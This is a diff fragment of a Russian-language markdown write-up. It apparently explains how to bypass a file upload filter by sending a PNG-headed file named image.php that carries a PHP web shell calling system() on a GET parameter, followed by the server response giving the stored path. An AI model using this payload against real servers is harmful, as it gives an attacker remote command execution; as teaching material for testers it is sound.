@@ -8,13 +8,13 @@
 Пример: Запрос на загрузку файла: \
 `Content-Disposition: form-data; name="file"; filename="image.php"` \
 `Content-Type: image/png`\
-``\
+\
 `%PNG .... IEND .. <?php system($_GET['blabla]); ?> -----------------WebKitFormBoundaryNJKDFNAJCNA`\
 
 
 В ответ: \
 `HTTP/1.1 200 OK`\
-``\
+\
 `{"path": "/some/path/crooped.php", "error": 0}`
 
 Следующий запрос: \
